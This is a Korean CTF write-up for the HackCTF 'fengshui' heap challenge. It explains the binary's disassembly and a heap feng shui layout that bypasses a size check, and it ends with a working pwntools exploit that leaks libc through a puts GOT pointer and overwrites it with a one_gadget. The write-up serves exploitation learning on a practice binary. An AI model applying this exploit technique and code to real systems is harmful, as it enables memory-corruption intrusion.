---
layout: post
title:  "HacCTF 풍수지리설 write-up"
date:   2020-03-25 19:45:55
image:  hackctf_poon_geo.PNG
tags:   [HackCTF]
categories: [Write-up]
---


### 1.  문제

---

**1) mitigation 확인**

![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF_foon/Untitled.png)

카나리와 NX 비트가 걸려있다.

<br>

**2) 문제 확인**

![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF_foon/Untitled%201.png)

각 메뉴가 출력되고 고르라고 나온다

- 0번 : description 사이즈를 입력하고 이름을 입력받음. 그다음 text 사이즈를 입력받고 text를 입력받음
- 1번 :  삭제하길 원하는 인덱스를 입력하면 삭제가 되는 듯하다
- 2번 : 출력하길 원하는 인덱스를 입력하면 description 정보가 출력되는 듯하다
- 3번 : 수정하길 원하는 인덱스를 입력하면 Text를 수정가능하다

<br>

**3) 코드흐름 파악**

- **add_location 함수**

        gdb-peda$ disas add_location
        Dump of assembler code for function add_location:
           0x08048816 <+0>:	push   ebp
           0x08048817 <+1>:	mov    ebp,esp
           0x08048819 <+3>:	sub    esp,0x28
           0x0804881c <+6>:	mov    eax,DWORD PTR [ebp+0x8]
           0x0804881f <+9>:	mov    DWORD PTR [ebp-0x1c],eax
           0x08048822 <+12>:	mov    eax,gs:0x14
           0x08048828 <+18>:	mov    DWORD PTR [ebp-0xc],eax
           0x0804882b <+21>:	xor    eax,eax
           0x0804882d <+23>:	sub    esp,0xc
           **0x08048830 <+26>:	push   DWORD PTR [ebp-0x1c]
           0x08048833 <+29>:	call   0x8048530 <malloc@plt>**
        	 ...
           **0x08048854 <+62>:	push   0x80
           0x08048859 <+67>:	call   0x8048530 <malloc@plt>**
           0x0804885e <+72>:	add    esp,0x10
           0x08048861 <+75>:	mov    DWORD PTR [ebp-0x10],eax
           **0x08048879 <+99>:	mov    eax,DWORD PTR [ebp-0x10]
           0x0804887c <+102>:	mov    edx,DWORD PTR [ebp-0x14]
           0x0804887f <+105>:	mov    DWORD PTR [eax],edx
        	 0x0804888b <+117>:	mov    edx,DWORD PTR [ebp-0x10]
           0x0804888e <+120>:	mov    DWORD PTR [eax*4+0x804b080],edx**
        	 0x080488af <+153>:	mov    eax,DWORD PTR [eax*4+0x804b080]
           0x080488b6 <+160>:	add    eax,0x4
           0x080488b9 <+163>:	sub    esp,0x8
           0x080488bc <+166>:	push   0x7c
           0x080488be <+168>:	push   eax
           **0x080488bf <+169>:	call   0x80486bb <read_len>**
           ...
           **0x080488e7 <+209>:	call   0x8048724 <update_desc>**
           ...

    1. main에서 1번 메뉴를 선택하면 description 사이즈를 입력 받는다. 그리고 입력한 사이즈를 인자로 하여 add_location함수가 호출되는데, +26 라인에서 해당 사이즈 만큼 malloc 한다. r할당받는 주소는 ebp-0x14에 들어간다
    2. 그다음 0x80 사이즈 만큼 malloc을 한번더 한다. 이는 ebp-0x10에 들어간다
    3. ebp-0x14 위치에 들어있는 값을 ebp-0x10가 가리키고 있는 값에 넣는다.
    4. ebp-0x10에 들어있는 값을 [eax*4+0x804b080]에 복사한다. 이는 bss영역이다
    5. +169라인에서 real_len을 호출해서 Name을 입력한다. 이는 bss영역의 배열의 있는 값 + 4 를 인자로 한다
    6. update_desc를 호출한다
        - 여기서 Text size와 Text가 입력된다.<br><br><br>

    정리를 하자면, add_location 함수를 통해 총 2개의 malloc이 이루어지고, 두번째로 malloc한 청크의 첫 페이로드 부분에 첫번째로 malloc한 청크의 주소가 들어간다.

    따라서 두번째로 malloc한 청크의 페이로드+4 위치에 입력한 Name이 들어간다.

    두번째로 malloc한 청크의 페이로드 첫 시작주소에 들어있는 첫 malloc 청크의 페이로드에 Text가 들어간다.

<br><br>

- delete_location 함수

        	 0x08048905 <+0>:	push   ebp
           0x08048906 <+1>:	mov    ebp,esp
           0x08048908 <+3>:	sub    esp,0x28
           0x0804890b <+6>:	mov    eax,DWORD PTR [ebp+0x8]
           0x0804890e <+9>:	mov    BYTE PTR [ebp-0x1c],al
           0x08048911 <+12>:	mov    eax,gs:0x14
           0x08048917 <+18>:	mov    DWORD PTR [ebp-0xc],eax
           0x0804891a <+21>:	xor    eax,eax
           **0x0804891c <+23>:	movzx  eax,BYTE PTR ds:0x804b069
           0x08048923 <+30>:	cmp    BYTE PTR [ebp-0x1c],al**
           0x08048926 <+33>:	jae    0x8048978 <delete_location+115>
           0x08048928 <+35>:	movzx  eax,BYTE PTR [ebp-0x1c]
           **0x0804892c <+39>:	mov    eax,DWORD PTR [eax*4+0x804b080]
           0x08048933 <+46>:	test   eax,eax**
           0x08048935 <+48>:	je     0x804897b <delete_location+118>
           0x08048937 <+50>:	movzx  eax,BYTE PTR [ebp-0x1c]
           0x0804893b <+54>:	mov    eax,DWORD PTR [eax*4+0x804b080]
           0x08048942 <+61>:	mov    eax,DWORD PTR [eax]
           0x08048944 <+63>:	sub    esp,0xc
           0x08048947 <+66>:	push   eax
           0x08048948 <+67>:	call   0x80484f0 <free@plt>
           0x0804894d <+72>:	add    esp,0x10
           0x08048950 <+75>:	movzx  eax,BYTE PTR [ebp-0x1c]
           0x08048954 <+79>:	mov    eax,DWORD PTR [eax*4+0x804b080]
           0x0804895b <+86>:	sub    esp,0xc
           0x0804895e <+89>:	push   eax
           0x0804895f <+90>:	call   0x80484f0 <free@plt>
           ...

    1. add_location이 한번 호출되면, bss영역의 존재하는 배열의 인덱스를 가리키는 값이 하나 증가가 된다. +23라인을 보면 0x804b069 위치에 해당 인덱스 값이 들어있는데, 삭제하려는 인덱스가 현재 저장된 인덱스값보다 작아야지만 삭제 가능한 조건이 있다
    2. 또한 현재 삭제하려는 인덱스에 포함되어있는 데이터가 없어야 삭제 가능하다

    따라서 1,2번 조건때문에 free된 청크의 접근이 불가하고, 비정상적인 인덱스는 free가 불가하다

<br><br>

- **display_location 함수**

        gdb-peda$ disas display_location
        Dump of assembler code for function display_location:
           0x0804898f <+0>:	push   ebp
           0x08048990 <+1>:	mov    ebp,esp
           0x08048992 <+3>:	sub    esp,0x28
           0x08048995 <+6>:	mov    eax,DWORD PTR [ebp+0x8]
           0x08048998 <+9>:	mov    BYTE PTR [ebp-0x1c],al
           0x0804899b <+12>:	mov    eax,gs:0x14
           0x080489a1 <+18>:	mov    DWORD PTR [ebp-0xc],eax
           0x080489a4 <+21>:	xor    eax,eax
           0x080489a6 <+23>:	movzx  eax,BYTE PTR ds:0x804b069
           0x080489ad <+30>:	cmp    BYTE PTR [ebp-0x1c],al
           0x080489b0 <+33>:	jae    0x8048a00 <display_location+113>
           0x080489b2 <+35>:	movzx  eax,BYTE PTR [ebp-0x1c]
           0x080489b6 <+39>:	mov    eax,DWORD PTR [eax*4+0x804b080]
           0x080489bd <+46>:	test   eax,eax
           0x080489bf <+48>:	je     0x8048a03 <display_location+116>
           0x080489c1 <+50>:	movzx  eax,BYTE PTR [ebp-0x1c]
           0x080489c5 <+54>:	mov    eax,DWORD PTR [eax*4+0x804b080]
           0x080489cc <+61>:	add    eax,0x4
           0x080489cf <+64>:	sub    esp,0x8
           0x080489d2 <+67>:	push   eax
           0x080489d3 <+68>:	push   0x8048cd8
           **0x080489d8 <+73>:	call   0x80484e0 <printf@plt>**
           0x080489dd <+78>:	add    esp,0x10
           0x080489e0 <+81>:	movzx  eax,BYTE PTR [ebp-0x1c]
           0x080489e4 <+85>:	mov    eax,DWORD PTR [eax*4+0x804b080]
           0x080489eb <+92>:	mov    eax,DWORD PTR [eax]
           0x080489ed <+94>:	sub    esp,0x8
           0x080489f0 <+97>:	push   eax
           0x080489f1 <+98>:	push   0x8048ce2
           **0x080489f6 <+103>:	call   0x80484e0 <printf@plt>**
        	 ...

    1. 이름과 Text를 출력해주는 함수이다.

<br><br>

- **update_desc 함수**

        gdb-peda$ disas update_desc
        Dump of assembler code for function update_desc:
        	 ...
           0x08048785 <+97>:	call   0x80485a0 <__isoc99_scanf@plt>
           0x0804878a <+102>:	add    esp,0x10
           0x0804878d <+105>:	movzx  eax,BYTE PTR [ebp-0x1c]
           **0x08048791 <+109>:	mov    eax,DWORD PTR [eax*4+0x804b080]
           0x08048798 <+116>:	mov    eax,DWORD PTR [eax]
           0x0804879a <+118>:	mov    edx,eax**
           **0x0804879c <+120>:	mov    eax,DWORD PTR [ebp-0x10]
           0x0804879f <+123>:	add    edx,eax
           0x080487a1 <+125>:	movzx  eax,BYTE PTR [ebp-0x1c]
           0x080487a5 <+129>:	mov    eax,DWORD PTR [eax*4+0x804b080]
           0x080487ac <+136>:	sub    eax,0x4
           0x080487af <+139>:	cmp    edx,eax**
           0x080487b1 <+141>:	jb     0x80487cd <update_desc+169>
           0x080487b3 <+143>:	sub    esp,0xc
        	 ...

    1. Text size를 다시 입력받고, Text를 다시 수정할수 있는 함수이다. 여기서 두개의 조건을 통과해야지만 수정이 가능하다
    2. <+109> : bss영역에 있는 배열에 선택한 인덱스를 참조하여 eax복사한다
    3. <+116> : [eax]에는 현재 Text를 담는 동적할당받은 주소가 담겨있는데 이를 다시 eax에 복사
    4. <+118 ~ +120> : eax값을 edx에 넣고, 수정하려는 text사이즈와 edx를 더한다
    5. <+129 ~ +136> : bss영역에 있는 배열에 선택한 인덱스를 참조하여 eax에 복사하고 해당 주소에 +4를 함
    6.  <+139> : edx와 eax를 비교하여 eax가 더 크면 <update_desc+169>로 이동하고 아니면 다음 진행

    해당 조건문의 의미는, 입력한 text가 description 영역을 침범하지 못하도록 하기위함이다.

<br><br><br>

### 2. 접근방법

---

일단 double free나 uaf 같은 기법은 불가능하다. delete_location 함수에서 free시킨 동적할당영역은 0으로 초기화를 하고 접근하면 안되는 인덱스를 막는 조건문이 존재하기 때문이다.

현재 add_location() 함수은 다음과 같이 동작한다<br><br>

![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF_foon/Untitled%202.png)

S는 Text를 담는 영역, V2는 desc영역이다.<br><br>

총 3번 add_location 함수를 호출했다고 가정해보자.

- 처음에 S_0 영역이 malloc되고, 두번째로 V2_0 영역이 malloc된다. 그리고 store 전역변수에 V2_0주소가 들어간다.
- text size는 20이라고 가정했을때 조건문을 만족하지 않는다. 즉 exit함수로 가지 않고 text를 입력받게 된다.
- 그다음도 같은 방식으로 동작한다.
- 일반적으로 free를 하지 않은 상태에서 계속 add_location으로 description 영역을 할당받는다면 위와 같이 순차적으로 힙 영역을 할당 받을 것이다
- 따라서 만약 desc영역의 사이즈보다 큰 text size를 입력하게 된다면, text 영역이 desc 영역을 침범하지 못하게 걸어둔 조건문에 의해 힙 오버플로우가 방지가 된다<br><br>

하지만 항상 저렇게 순차적으로 힙이 할당받는다는 보장이 없다. 현재 v2는 항상 0x80사이즈로 고정 크기이다.  저위 그림을 기준으로 만약 0번째 인덱스를 free시킨다면 text를 저장하는 S_0 힙 영역의 size가 0x20이므로 fasbin에 들어갈 것이고, 나머지 v2_0는 unsorted bin에 들어갈 것이다.<br><br>

그다음 add_location 함수를 한번더 호출하여 desc size를 입력할때 0x80를 주게된다면, unsorted bin에 있는 청크를 S_3에 재할당해주고, V2_3는 고정크기 0x80이므로 순차적으로 V2_2 청크 아래에 할당해줄 것이다.<br><br>

![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF_foon/Untitled%203.png)

- index 0, 1, 2 중에서 0이 free되면 store[0]은 0으로 초기화 된다
- 그리고 처음에 S영역을 malloc 받는데, 0x80을 요청했으므로 unsorted bin에 들어있는 0x80크기의 V2_0 영역을 재할당해준다. 따라서 기존 V2_0 영역이 V2_3으로 덮힌다
- 그리고 고정 크기 0x80을 한번더 malloc 하므로 이는 V2_2 아래에 할당받는다.<br><br>

이렇게 되면 처음에 S_3 영역이 0x80 동일크기이기 때문에 V2_0에 들어간다. 그리고, text size를 입력할때 0x80보다 크게 입력을 해도, update_desc의 조건문에 만족하지 않게 되어 index_1, index_2 영역을 heap overflow를 이용하여 덮을 수 있다.

![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF_foon/Untitled%204.png)

이렇게 heap의 layout을 조정하여 조지는 방법을 heap fengshui 라고 한다

<br><br>

- **시나리오**
    1. display_location 함수를 호출하면 [v2]에 들어있는 주소를 인자로 하여 printf가 호출된다. 따라서 heapoverflow를 이용하여 index_1의 [v2_1]에 들어있는 S_1 주소를 puts_got로 변경시켜 puts_ libc 주소를 leak한다
    2. leak한 주소를 이용하여 libc_base 주소를 구한다
    3. update_desc함수를 이용하여 [S_1]에 들어있는 값을 변경가능하다. 원래는 여기에 Text 가 들어있을테지만, 1번이 진행되면 S_1가 puts_got로 변경되어 [S_1]에는 puts_의 libc주소가 들어가 있을 것이다
    4. 따라서 update_des를 이용하여 [S_1]에 들어있는 값을 one_gadet으로 덮는다

    참고로 heapoverflow를 일으킬때 chunk header 같은 것은 변조되지 않도록 적절히 맞춰줘야한다.

<br><br><br>

### 3. 풀이

---

최종 익스코드는 다음과 같다
```python
from pwn import *
context(arch="amd64",os="linux",log_level="DEBUG")

#p=remote("ctf.j0n9hyun.xyz",3028)
env = {"LD_PRELOAD": os.path.join(os.getcwd(), "./libc.so.6")}
p=process("./fengshui")
e=ELF("./fengshui")
libc=ELF("./libc.so.6")

gdb.attach(p,'code\nb *0xBDB+$code\n')

def add_(des_size,name,text_size,text):
p.sendlineafter("Choice: ","0")
p.sendlineafter("Size of description: ",str(des_size))
p.sendlineafter("Name: ",name)
p.sendlineafter("Text length: ",str(text_size))
p.sendlineafter("Text: ",text)

def del_(index):
p.sendlineafter("Choice: ","1")
p.sendlineafter("Index: ",str(index))

def show_(index):
    p.sendlineafter("Choice: ","2")
    p.sendlineafter("Index: ",str(index))

def update_(index,text_size,text):
    p.sendlineafter("Choice: ","3")
    p.sendlineafter("Index: ",str(index))
    p.sendlineafter("Text length: ",str(text_size))
    p.sendlineafter("Text: ",text)


add_(10,"AAAA",8,"AAAA")
add_(10,"AAAA",8,"AAAA")
add_(10,"AAAA",8,"AAAA")

del_(0)

payload='a'*0x80+p32(0x88)+p32(0x11)+'A'*8+p32(0)+p32(0x89)+p32(e.got['puts'])

add_(128,"AAAA",len(payload),str(payload))

show_(1)

p.recvuntil("Description: ")

puts_addr=u32(p.recv(4))
libc_base=puts_addr-0x0005fca0
one_gadget=libc_base+0x3ac5e

log.info(hex(puts_addr))

update_(1,4,p32(one_gadget))

#del_(1)

p.interactive()
```
<br><br><br>

### 4. 몰랐던 개념

---